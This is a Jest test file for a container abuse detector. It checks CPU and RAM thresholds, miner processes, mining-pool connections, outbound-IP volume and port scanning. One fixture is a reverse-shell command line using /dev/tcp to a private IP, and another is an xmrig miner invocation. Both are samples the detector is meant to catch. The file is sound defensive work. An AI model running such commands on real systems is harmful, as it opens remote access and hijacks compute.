import { ContainerTelemetry, DEFAULT_ABUSE_THRESHOLDS, detectContainerRisks } from "./abuse-detection";

function telemetry(overrides: Partial<ContainerTelemetry> = {}): ContainerTelemetry {
  return {
    containerId: "container-1",
    cpuPct: 10,
    ramPct: 10,
    processes: [],
    connections: [],
    ...overrides,
  };
}

describe("detectContainerRisks", () => {
  it("returns nothing for a quiet, well-behaved container", () => {
    expect(detectContainerRisks(telemetry())).toEqual([]);
  });

  it("flags sustained CPU above the threshold at MEDIUM severity below 99%", () => {
    const risks = detectContainerRisks(telemetry({ cpuPct: 95 }));
    expect(risks).toHaveLength(1);
    expect(risks[0]).toMatchObject({ type: "CPU_ABUSE", severity: "MEDIUM" });
  });

  it("flags sustained CPU at HIGH severity at or above 99%", () => {
    const risks = detectContainerRisks(telemetry({ cpuPct: 99.5 }));
    expect(risks[0]).toMatchObject({ type: "CPU_ABUSE", severity: "HIGH" });
  });

  it("flags sustained memory above the threshold at MEDIUM severity below 99%", () => {
    const risks = detectContainerRisks(telemetry({ ramPct: 92 }));
    expect(risks).toMatchObject([{ type: "RAM_ABUSE", severity: "MEDIUM" }]);
  });

  it("flags a known miner process at CRITICAL severity regardless of CPU", () => {
    const risks = detectContainerRisks(
      telemetry({ cpuPct: 20, processes: [{ pid: "42", cpuPct: 400, command: "/usr/bin/xmrig -o pool.example:3333" }] }),
    );
    expect(risks).toContainEqual(
      expect.objectContaining({ type: "CRYPTO_MINING", severity: "CRITICAL" }),
    );
  });

  it("flags a reverse-shell-shaped command line as a suspicious process", () => {
    const risks = detectContainerRisks(
      telemetry({ processes: [{ pid: "7", cpuPct: 0, command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" }] }),
    );
    expect(risks).toContainEqual(expect.objectContaining({ type: "SUSPICIOUS_PROCESS" }));
  });

  it("flags a single connection to a known mining-pool port even without volume", () => {
    const risks = detectContainerRisks(
      telemetry({ connections: [{ remoteIp: "203.0.113.5", remotePort: 3333, state: "ESTABLISHED" }] }),
    );
    expect(risks).toContainEqual(expect.objectContaining({ type: "OUTBOUND_CONNECTION", severity: "CRITICAL" }));
  });

  it("flags an unusually high number of distinct outbound IPs", () => {
    const connections = Array.from({ length: DEFAULT_ABUSE_THRESHOLDS.outboundDistinctIpThreshold }, (_, i) => ({
      remoteIp: `198.51.100.${i}`,
      remotePort: 443,
      state: "ESTABLISHED",
    }));
    const risks = detectContainerRisks(telemetry({ connections }));
    expect(risks).toContainEqual(expect.objectContaining({ type: "OUTBOUND_CONNECTION", severity: "MEDIUM" }));
  });

  it("does not flag outbound connections below the distinct-IP threshold", () => {
    const connections = Array.from({ length: 5 }, (_, i) => ({
      remoteIp: `198.51.100.${i}`,
      remotePort: 443,
      state: "ESTABLISHED",
    }));
    expect(detectContainerRisks(telemetry({ connections }))).toEqual([]);
  });

  it("flags many distinct SYN_SENT ports as port scanning", () => {
    const connections = Array.from({ length: DEFAULT_ABUSE_THRESHOLDS.portScanDistinctPortThreshold }, (_, i) => ({
      remoteIp: "198.51.100.9",
      remotePort: 1000 + i,
      state: "SYN_SENT",
    }));
    const risks = detectContainerRisks(telemetry({ connections }));
    expect(risks).toContainEqual(expect.objectContaining({ type: "PORT_SCANNING" }));
  });

  it("can report multiple simultaneous risks from one sample", () => {
    const risks = detectContainerRisks(
      telemetry({
        cpuPct: 97,
        ramPct: 95,
        processes: [{ pid: "1", cpuPct: 97, command: "xmrig" }],
      }),
    );
    const types = risks.map((r) => r.type).sort();
    expect(types).toEqual(["CPU_ABUSE", "CRYPTO_MINING", "RAM_ABUSE"].sort());
  });

  it("respects custom thresholds", () => {
    expect(detectContainerRisks(telemetry({ cpuPct: 50 }), { ...DEFAULT_ABUSE_THRESHOLDS, cpuAbusePct: 40 })).toContainEqual(
      expect.objectContaining({ type: "CPU_ABUSE" }),
    );
  });
});
